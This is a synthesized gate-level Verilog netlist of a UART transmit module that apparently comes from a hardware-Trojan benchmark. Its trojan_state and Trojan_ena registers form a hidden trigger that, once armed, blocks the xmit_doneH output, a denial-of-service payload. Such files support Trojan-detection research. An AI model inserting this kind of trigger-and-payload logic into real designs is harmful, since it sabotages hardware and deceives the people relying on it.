/////////////////////////////////////////////////////////////
// Created by: Synopsys DC Ultra(TM) in wire load mode
// Version   : R-2020.09-SP4
// Date      : Mon Oct 11 13:27:58 2021
/////////////////////////////////////////////////////////////
`timescale 1ps / 1ps

module u_xmit ( clk, rst, uart_xmitH, xmitH, xmit_dataH, xmit_doneH );
  input [7:0] xmit_dataH;
  input clk, rst, xmitH;
  output uart_xmitH, xmit_doneH;
  wire   N37, N38, N39, N40, N58, N59, N60, N61, N62, N63, N64, N65,
         Trojan_ena, N122, n53, n54, n55, n56, n57, n58, n59, n60, n61, n62,
         n63, n64, n65, n66, n67, n69, n70, n71, n72, n73, n74, n75, n76, n77,
         n78, n79, n80, n81, n82, n83, n84, n85, n86, n87, n88, n89, n90, n91,
         n92, n93, n94, n95, n96, n97, n98, n99, n100, n101, n102,  n104,
          n106, n107, n108, n109;
  wire   [7:0] xmit_ShiftRegH;
  wire   [3:0] bitCell_cntrH/*verilator public*/;
  reg    [2:0] state/*verilator public*/;
  wire   [3:0] bitCountH/*verilator public*/;
  wire   [2:0] next_state;
  wire   [1:0] trojan_state;

  reg	 n105, n103;
  
always @(posedge clk) 
begin
 if(rst==1'b0)
  begin
  state[0] = 1'b0;
  state[1] = 1'b0; 
  state[2] = 1'b0; 
  end
 else 
  begin
  state[0] = next_state[0];
  n105 = ~next_state[0];
  state[1] = next_state[1];
  n103 = ~next_state[1];
  state[2] = next_state[2];
  end
end

  //DFFARX1 \state_reg[0]  ( .D(next_state[0]), .CLK(clk), .RSTB(rst), .Q(        state[0]), .QN(n105) );
  //DFFARX1 \state_reg[2]  ( .D(next_state[2]), .CLK(clk), .RSTB(rst), .Q(        state[2]), .QN() );
  //DFFARX1 \state_reg[1]  ( .D(next_state[1]), .CLK(clk), .RSTB(rst), .Q(        state[1]), .QN(n103) );
  DFFARX1 \bitCell_cntrH_reg[0]  ( .D(N37), .CLK(clk), .RSTB(rst), .Q(
        bitCell_cntrH[0]), .QN(n102) );
  DFFARX1 \bitCell_cntrH_reg[1]  ( .D(N38), .CLK(clk), .RSTB(rst), .Q(
        bitCell_cntrH[1]), .QN(n107) );
  DFFARX1 \bitCell_cntrH_reg[2]  ( .D(N39), .CLK(clk), .RSTB(rst), .Q(
        bitCell_cntrH[2]), .QN() );
  DFFARX1 \bitCell_cntrH_reg[3]  ( .D(N40), .CLK(clk), .RSTB(rst), .Q(
        bitCell_cntrH[3]), .QN(n109) );
  DFFARX1 \xmit_ShiftRegH_reg[7]  ( .D(N65), .CLK(clk), .RSTB(rst), .Q(
        xmit_ShiftRegH[7]), .QN() );
  DFFARX1 \xmit_ShiftRegH_reg[6]  ( .D(N64), .CLK(clk), .RSTB(rst), .Q(
        xmit_ShiftRegH[6]), .QN() );
  DFFARX1 \xmit_ShiftRegH_reg[5]  ( .D(N63), .CLK(clk), .RSTB(rst), .Q(
        xmit_ShiftRegH[5]), .QN() );
  DFFARX1 \xmit_ShiftRegH_reg[4]  ( .D(N62), .CLK(clk), .RSTB(rst), .Q(
        xmit_ShiftRegH[4]), .QN() );
  DFFARX1 \xmit_ShiftRegH_reg[3]  ( .D(N61), .CLK(clk), .RSTB(rst), .Q(
        xmit_ShiftRegH[3]), .QN() );
  DFFARX1 \xmit_ShiftRegH_reg[2]  ( .D(N60), .CLK(clk), .RSTB(rst), .Q(
        xmit_ShiftRegH[2]), .QN() );
  DFFARX1 \xmit_ShiftRegH_reg[1]  ( .D(N59), .CLK(clk), .RSTB(rst), .Q(
        xmit_ShiftRegH[1]), .QN() );
  DFFARX1 \xmit_ShiftRegH_reg[0]  ( .D(N58), .CLK(clk), .RSTB(rst), .Q(
        xmit_ShiftRegH[0]), .QN() );
  DFFARX1 \bitCountH_reg[3]  ( .D(n56), .CLK(clk), .RSTB(rst), .Q(bitCountH[3]), .QN(n106) );
  DFFARX1 \bitCountH_reg[0]  ( .D(n59), .CLK(clk), .RSTB(rst), .Q(bitCountH[0]), .QN() );
  DFFARX1 \bitCountH_reg[1]  ( .D(n58), .CLK(clk), .RSTB(rst), .Q(bitCountH[1]), .QN(n104) );
  DFFARX1 \bitCountH_reg[2]  ( .D(n57), .CLK(clk), .RSTB(rst), .Q(bitCountH[2]), .QN() );
  DFFARX1 \trojan_state_reg[0]  ( .D(n55), .CLK(clk), .RSTB(rst), .Q(
        trojan_state[0]), .QN(n108) );
  DFFARX1 \trojan_state_reg[1]  ( .D(n54), .CLK(clk), .RSTB(rst), .Q(
        trojan_state[1]), .QN() );
  DFFARX1 Trojan_ena_reg ( .D(n53), .CLK(clk), .RSTB(rst), .Q(Trojan_ena), 
        .QN() );
  DFFARX1 xmit_doneH_reg ( .D(N122), .CLK(clk), .RSTB(rst), .Q(xmit_doneH), 
        .QN() );
  NAND2X0 U79 ( .IN1(n88), .IN2(n84), .QN(n94) );
  NAND2X0 U80 ( .IN1(xmitH), .IN2(n65), .QN(n82) );
  NAND2X0 U81 ( .IN1(n85), .IN2(n77), .QN(n61) );
  NAND2X0 U82 ( .IN1(n66), .IN2(n80), .QN(next_state[1]) );
  NOR2X0 U83 ( .IN1(n103), .IN2(n105), .QN(n73) );
  NAND2X0 U84 ( .IN1(state[2]), .IN2(n105), .QN(n98) );
  INVX0 U85 ( .INP(n98), .ZN(n81) );
  NOR2X0 U86 ( .IN1(n73), .IN2(n81), .QN(n62) );
  NOR2X0 U87 ( .IN1(state[1]), .IN2(state[2]), .QN(n65) );
  INVX0 U88 ( .INP(n65), .ZN(n85) );
  NAND2X0 U89 ( .IN1(state[0]), .IN2(state[2]), .QN(n77) );
  NOR2X0 U90 ( .IN1(n62), .IN2(n61), .QN(n60) );
  AO22X1 U91 ( .IN1(n62), .IN2(n61), .IN3(xmit_ShiftRegH[0]), .IN4(n60), .Q(
        uart_xmitH) );
  INVX0 U92 ( .INP(n73), .ZN(n97) );
  NAND4X0 U93 ( .IN1(bitCell_cntrH[2]), .IN2(bitCell_cntrH[1]), .IN3(
        bitCell_cntrH[3]), .IN4(n102), .QN(n72) );
  NOR2X0 U94 ( .IN1(n97), .IN2(n72), .QN(n88) );
  INVX0 U95 ( .INP(n88), .ZN(n64) );
  NAND3X0 U96 ( .IN1(bitCell_cntrH[1]), .IN2(bitCell_cntrH[2]), .IN3(
        bitCell_cntrH[0]), .QN(n70) );
  INVX0 U97 ( .INP(n70), .ZN(n71) );
  NAND2X0 U98 ( .IN1(bitCell_cntrH[3]), .IN2(n71), .QN(n78) );
  INVX0 U99 ( .INP(n77), .ZN(n63) );
  NAND2X0 U100 ( .IN1(n78), .IN2(n63), .QN(n75) );
  NAND2X0 U101 ( .IN1(n64), .IN2(n75), .QN(next_state[2]) );
  OAI21X1 U102 ( .IN1(n105), .IN2(n72), .IN3(state[1]), .QN(n66) );
  INVX0 U103 ( .INP(n82), .ZN(n83) );
  NOR2X0 U104 ( .IN1(n81), .IN2(n83), .QN(n80) );
  NAND2X0 U105 ( .IN1(n75), .IN2(n66), .QN(n69) );
  AND2X1 U106 ( .IN1(n102), .IN2(n69), .Q(N37) );
  OA221X1 U107 ( .IN1(bitCell_cntrH[0]), .IN2(bitCell_cntrH[1]), .IN3(n102), 
        .IN4(n107), .IN5(n69), .Q(N38) );
  NOR2X0 U109 ( .IN1(n107), .IN2(n102), .QN(n67) );
  OA221X1 U110 ( .IN1(1'b0), .IN2(n69), .IN3(bitCell_cntrH[2]), .IN4(n67), 
        .IN5(n70), .Q(N39) );
  OA221X1 U111 ( .IN1(n71), .IN2(bitCell_cntrH[3]), .IN3(n70), .IN4(n109), 
        .IN5(n69), .Q(N40) );
  OR4X1 U112 ( .IN1(n106), .IN2(bitCountH[1]), .IN3(bitCountH[2]), .IN4(
        bitCountH[0]), .Q(n84) );
  OA22X1 U113 ( .IN1(n103), .IN2(n78), .IN3(n97), .IN4(n84), .Q(n76) );
  NAND2X0 U114 ( .IN1(n73), .IN2(n72), .QN(n74) );
  NAND4X0 U115 ( .IN1(n76), .IN2(n75), .IN3(n74), .IN4(n98), .QN(next_state[0]) );
  OA22X1 U116 ( .IN1(xmitH), .IN2(n85), .IN3(n78), .IN4(n77), .Q(n79) );
  NOR2X0 U117 ( .IN1(Trojan_ena), .IN2(n79), .QN(N122) );
  AO222X1 U118 ( .IN1(n81), .IN2(xmit_ShiftRegH[1]), .IN3(n83), .IN4(
        xmit_dataH[0]), .IN5(xmit_ShiftRegH[0]), .IN6(n80), .Q(N58) );
  AO222X1 U119 ( .IN1(n81), .IN2(xmit_ShiftRegH[2]), .IN3(n80), .IN4(
        xmit_ShiftRegH[1]), .IN5(n83), .IN6(xmit_dataH[1]), .Q(N59) );
  AO222X1 U120 ( .IN1(n81), .IN2(xmit_ShiftRegH[3]), .IN3(n80), .IN4(
        xmit_ShiftRegH[2]), .IN5(n83), .IN6(xmit_dataH[2]), .Q(N60) );
  AO222X1 U121 ( .IN1(n81), .IN2(xmit_ShiftRegH[4]), .IN3(n80), .IN4(
        xmit_ShiftRegH[3]), .IN5(n83), .IN6(xmit_dataH[3]), .Q(N61) );
  AO222X1 U122 ( .IN1(n81), .IN2(xmit_ShiftRegH[5]), .IN3(n80), .IN4(
        xmit_ShiftRegH[4]), .IN5(n83), .IN6(xmit_dataH[4]), .Q(N62) );
  AO222X1 U123 ( .IN1(n81), .IN2(xmit_ShiftRegH[6]), .IN3(n80), .IN4(
        xmit_ShiftRegH[5]), .IN5(n83), .IN6(xmit_dataH[5]), .Q(N63) );
  AO222X1 U124 ( .IN1(n81), .IN2(xmit_ShiftRegH[7]), .IN3(n80), .IN4(
        xmit_ShiftRegH[6]), .IN5(n83), .IN6(xmit_dataH[6]), .Q(N64) );
  AO221X1 U125 ( .IN1(n83), .IN2(xmit_dataH[7]), .IN3(n82), .IN4(
        xmit_ShiftRegH[7]), .IN5(n81), .Q(N65) );
  OA221X1 U126 ( .IN1(n85), .IN2(state[0]), .IN3(n85), .IN4(xmitH), .IN5(n94), 
        .Q(n87) );
  NOR2X0 U127 ( .IN1(bitCountH[0]), .IN2(n94), .QN(n86) );
  AO21X1 U128 ( .IN1(n87), .IN2(bitCountH[0]), .IN3(n86), .Q(n59) );
  NOR2X0 U129 ( .IN1(n87), .IN2(n86), .QN(n91) );
  NAND2X0 U130 ( .IN1(n88), .IN2(bitCountH[0]), .QN(n90) );
  MUX21X1 U131 ( .IN1(n91), .IN2(n90), .S(n104), .Q(n89) );
  INVX0 U132 ( .INP(n89), .ZN(n58) );
  NOR2X0 U133 ( .IN1(n104), .IN2(n90), .QN(n96) );
  OA21X1 U134 ( .IN1(bitCountH[1]), .IN2(n94), .IN3(n91), .Q(n93) );
  INVX0 U135 ( .INP(n93), .ZN(n92) );
  MUX21X1 U136 ( .IN1(n96), .IN2(n92), .S(bitCountH[2]), .Q(n57) );
  OAI21X1 U137 ( .IN1(bitCountH[2]), .IN2(n94), .IN3(n93), .QN(n95) );
  OA222X1 U138 ( .IN1(bitCountH[3]), .IN2(bitCountH[2]), .IN3(bitCountH[3]), 
        .IN4(n96), .IN5(n106), .IN6(n95), .Q(n56) );
  NOR2X0 U139 ( .IN1(n97), .IN2(state[2]), .QN(n101) );
  INVX0 U140 ( .INP(n101), .ZN(n100) );
  NOR3X0 U141 ( .IN1(trojan_state[1]), .IN2(n98), .IN3(n103), .QN(n99) );
  AO221X1 U142 ( .IN1(trojan_state[0]), .IN2(trojan_state[1]), .IN3(
        trojan_state[0]), .IN4(n100), .IN5(n99), .Q(n55) );
  AO21X1 U143 ( .IN1(trojan_state[0]), .IN2(n101), .IN3(trojan_state[1]), .Q(
        n54) );
  AO21X1 U144 ( .IN1(trojan_state[1]), .IN2(n108), .IN3(Trojan_ena), .Q(n53)
         );
endmodule

